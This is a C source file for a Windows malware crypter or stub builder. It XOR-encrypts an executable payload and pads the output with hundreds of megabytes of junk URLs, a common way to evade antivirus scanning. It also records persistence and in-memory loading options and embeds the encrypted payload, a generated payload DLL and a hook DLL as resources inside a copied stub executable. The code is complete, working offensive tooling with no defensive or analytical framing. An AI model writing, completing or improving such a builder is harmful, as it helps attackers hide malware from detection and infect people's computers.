#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr, "Usage: %s <payload_path> <output_path> <key_hex> <junk_size_mb> <persistence> <load_in_memory>\n", argv[0]);
        return 1;
    }

    const char *payload_path = argv[1];
    const char *output_path = argv[2];
    const char *key_hex = argv[3];
    int junk_size_mb = atoi(argv[4]);
    int persistence = atoi(argv[5]);
    int load_in_memory = atoi(argv[6]);

    // Validate key_hex (should be 64 chars for a 32-byte key)
    if (strlen(key_hex) != 64) {
        fprintf(stderr, "Error: Key must be a 64-character hex string (32 bytes).\n");
        return 1;
    }

    // Convert key_hex to bytes
    unsigned char key[32];
    hex_to_bytes(key_hex, key, 32);
    printf("Encryption key first 4 bytes: %02x %02x %02x %02x\n", key[0], key[1], key[2], key[3]);

    // Validate junk_size_mb
    if (junk_size_mb < 0 || junk_size_mb > 500) {
        fprintf(stderr, "Error: Junk size must be between 0 and 500 MB.\n");
        return 1;
    }

    // Validate persistence and load_in_memory
    if (persistence != 0 && persistence != 1) {
        fprintf(stderr, "Error: Persistence must be 0 or 1.\n");
        return 1;
    }
    if (load_in_memory != 0 && load_in_memory != 1) {
        fprintf(stderr, "Error: Load in memory must be 0 or 1.\n");
        return 1;
    }

    // Read the payload file
    FILE *payload_file = fopen(payload_path, "rb");
    if (!payload_file) {
        fprintf(stderr, "Error: Could not open payload file: %s\n", payload_path);
        return 1;
    }

    fseek(payload_file, 0, SEEK_END);
    long payload_size = ftell(payload_file);
    fseek(payload_file, 0, SEEK_SET);

    unsigned char *payload_data = malloc(payload_size);
    if (!payload_data) {
        fprintf(stderr, "Error: Could not allocate memory for payload.\n");
        fclose(payload_file);
        return 1;
    }

    if (fread(payload_data, 1, payload_size, payload_file) != payload_size) {
        fprintf(stderr, "Error: Could not read payload file.\n");
        free(payload_data);
        fclose(payload_file);
        return 1;
    }
    fclose(payload_file);

    printf("Payload first 4 bytes before encryption: %02x %02x %02x %02x\n",
           payload_data[0], payload_data[1], payload_data[2], payload_data[3]);
    if (payload_data[0] == 0x4D && payload_data[1] == 0x5A) {
        printf("Payload has valid DOS signature (MZ).\n");
    }

    // Encrypt the payload with XOR
    for (long i = 0; i < payload_size; i++) {
        payload_data[i] ^= key[i % 32];
    }
    printf("Payload encrypted successfully, size: %ld bytes\n", payload_size);

    // Calculate junk URL count and generate junk data
    long target_size_bytes = junk_size_mb * 1024 * 1024;
    long url_count = target_size_bytes / 30;
    size_t junk_size = url_count * 30;
    unsigned char *junk_data = NULL;
    if (url_count > 0) {
        junk_data = malloc(junk_size);
        if (!junk_data) {
            fprintf(stderr, "Error: Could not allocate memory for junk data.\n");
            free(payload_data);
            return 1;
        }
        // Generate junk URLs (e.g., "http://exampleX.com")
        for (long i = 0; i < url_count; i++) {
            snprintf((char *)(junk_data + i * 30), 30, "http://example%ld.com", i);
        }
        printf("Generated %ld junk URLs, total size: %zu bytes\n", url_count, junk_size);
    } else {
        printf("No junk URLs to generate (junk_size_mb = %d).\n", junk_size_mb);
    }

    // Create a structure to hold the payload metadata and data
    typedef struct {
        char key_hex[65];           // 64 chars + null terminator
        unsigned char persistence;  // 1 byte
        uint32_t junk_url_count;    // 4 bytes
        uint64_t payload_size;      // 8 bytes
        unsigned char load_in_memory; // 1 byte
        unsigned char payload_data[1]; // Variable length
    } PayloadConfig;

    // Calculate the total size using offsetof to ensure correct allocation
    size_t config_size = offsetof(PayloadConfig, payload_data) + payload_size;
    printf("PayloadConfig size: fixed part=%zu, payload_size=%ld, total=%zu bytes\n",
           offsetof(PayloadConfig, payload_data), payload_size, config_size);
    printf("Offset of payload_data: %zu\n", offsetof(PayloadConfig, payload_data));

    PayloadConfig *config = malloc(config_size);
    if (!config) {
        fprintf(stderr, "Error: Could not allocate memory for payload config.\n");
        free(payload_data);
        if (junk_data) free(junk_data);
        return 1;
    }

    strncpy(config->key_hex, key_hex, 65);
    config->persistence = (unsigned char)persistence;
    config->junk_url_count = (uint32_t)url_count;
    config->payload_size = (uint64_t)payload_size;
    config->load_in_memory = (unsigned char)load_in_memory;
    memcpy(config->payload_data, payload_data, payload_size);

    free(payload_data); // No longer needed after copying to config

    // Copy stub.exe to the user-specified output_path
    if (!CopyFileA("stub.exe", output_path, FALSE)) {
        fprintf(stderr, "Error: Failed to copy stub.exe to %s: %d\n", output_path, GetLastError());
        free(config);
        if (junk_data) free(junk_data);
        return 1;
    }
    printf("Copied stub.exe to %s\n", output_path);

    // Embed resources into the output executable
    HANDLE hUpdate = BeginUpdateResource(output_path, FALSE);
    if (!hUpdate) {
        fprintf(stderr, "Error: BeginUpdateResource for output executable failed: %d\n", GetLastError());
        free(config);
        if (junk_data) free(junk_data);
        return 1;
    }
    printf("BeginUpdateResource successful for %s\n", output_path);

    if (load_in_memory) {
        // Step 1: Copy template.dll to payload.dll and embed the PayloadConfig resource
        if (!CopyFileA("template.dll", "payload.dll", FALSE)) {
            fprintf(stderr, "Error: Failed to copy template.dll to payload.dll: %d\n", GetLastError());
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("Copied template.dll to payload.dll\n");

        HANDLE hDllUpdate = BeginUpdateResource("payload.dll", FALSE);
        if (!hDllUpdate) {
            fprintf(stderr, "Error: BeginUpdateResource for payload.dll failed: %d\n", GetLastError());
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("BeginUpdateResource successful for payload.dll\n");

        // Add the PayloadConfig as a resource in payload.dll
        if (!UpdateResource(hDllUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config, config_size)) {
            fprintf(stderr, "Error: UpdateResource for PayloadConfig in payload.dll failed: %d\n", GetLastError());
            EndUpdateResource(hDllUpdate, TRUE);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("Embedded PayloadConfig resource into payload.dll\n");

        // Commit the resource changes to payload.dll
        if (!EndUpdateResource(hDllUpdate, FALSE)) {
            fprintf(stderr, "Error: EndUpdateResource for payload.dll failed: %d\n", GetLastError());
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("EndUpdateResource successful for payload.dll\n");

        // Step 2: Read payload.dll into memory and embed it into the output executable
        FILE *dll_file = fopen("payload.dll", "rb");
        if (!dll_file) {
            fprintf(stderr, "Error: Could not open payload.dll: %d\n", GetLastError());
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }

        fseek(dll_file, 0, SEEK_END);
        long dll_size = ftell(dll_file);
        fseek(dll_file, 0, SEEK_SET);

        unsigned char *dll_data = malloc(dll_size);
        if (!dll_data) {
            fprintf(stderr, "Error: Could not allocate memory for payload.dll data.\n");
            fclose(dll_file);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }

        if (fread(dll_data, 1, dll_size, dll_file) != dll_size) {
            fprintf(stderr, "Error: Could not read payload.dll.\n");
            free(dll_data);
            fclose(dll_file);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        fclose(dll_file);
        printf("Read payload.dll into memory, size: %ld bytes\n", dll_size);

        // Remove the temporary payload.dll file
        if (!DeleteFileA("payload.dll")) {
            fprintf(stderr, "Warning: Could not delete temporary payload.dll: %d\n", GetLastError());
        } else {
            printf("Deleted temporary payload.dll\n");
        }

        // Embed the DLL into the output executable
        if (!UpdateResource(hUpdate, "PAYLOAD", "DLL", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), dll_data, dll_size)) {
            fprintf(stderr, "Error: UpdateResource for payload.dll failed: %d\n", GetLastError());
            EndUpdateResource(hUpdate, TRUE);
            free(dll_data);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("Embedded payload.dll resource into %s\n", output_path);

        free(dll_data);

        // Step 3: Embed hook.dll into the output executable
        FILE *hook_dll_file = fopen("hook.dll", "rb");
        if (!hook_dll_file) {
            fprintf(stderr, "Error: Could not open hook.dll: %d\n", GetLastError());
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }

        fseek(hook_dll_file, 0, SEEK_END);
        long hook_dll_size = ftell(hook_dll_file);
        fseek(hook_dll_file, 0, SEEK_SET);

        unsigned char *hook_dll_data = malloc(hook_dll_size);
        if (!hook_dll_data) {
            fprintf(stderr, "Error: Could not allocate memory for hook.dll data.\n");
            fclose(hook_dll_file);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }

        if (fread(hook_dll_data, 1, hook_dll_size, hook_dll_file) != hook_dll_size) {
            fprintf(stderr, "Error: Could not read hook.dll.\n");
            free(hook_dll_data);
            fclose(hook_dll_file);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        fclose(hook_dll_file);
        printf("Read hook.dll into memory, size: %ld bytes\n", hook_dll_size);

        // Embed hook.dll into the output executable as HOOKDLL
        if (!UpdateResource(hUpdate, "PAYLOAD", "HOOKDLL", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), hook_dll_data, hook_dll_size)) {
            fprintf(stderr, "Error: UpdateResource for hook.dll failed: %d\n", GetLastError());
            EndUpdateResource(hUpdate, TRUE);
            free(hook_dll_data);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("Embedded hook.dll resource into %s\n", output_path);

        free(hook_dll_data);
    } else {
        // For on-disk execution, embed the PayloadConfig directly into the output executable
        if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config, config_size)) {
            fprintf(stderr, "Error: UpdateResource for PayloadConfig in output executable failed: %d\n", GetLastError());
            EndUpdateResource(hUpdate, TRUE);
            free(config);
            if (junk_data) free(junk_data);
            return 1;
        }
        printf("Embedded PayloadConfig resource directly into %s\n", output_path);
    }

    // Embed junk URLs if any
    if (junk_data && url_count > 0) {
        if (!UpdateResource(hUpdate, "JUNK", "URLS", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), junk_data, junk_size)) {
            fprintf(stderr, "Error: UpdateResource for junk URLs failed: %d\n", GetLastError());
            EndUpdateResource(hUpdate, TRUE);
            free(config);
            free(junk_data);
            return 1;
        }
        printf("Embedded %ld junk URLs into %s, total size: %zu bytes\n", url_count, output_path, junk_size);
    }

    // Commit the resource changes to the output executable
    if (!EndUpdateResource(hUpdate, FALSE)) {
        fprintf(stderr, "Error: EndUpdateResource for output executable failed: %d\n", GetLastError());
        free(config);
        if (junk_data) free(junk_data);
        return 1;
    }
    printf("EndUpdateResource successful for %s\n", output_path);

    free(config);
    if (junk_data) free(junk_data);

    printf("Stub generated successfully: %s\n", output_path);
    return 0;
}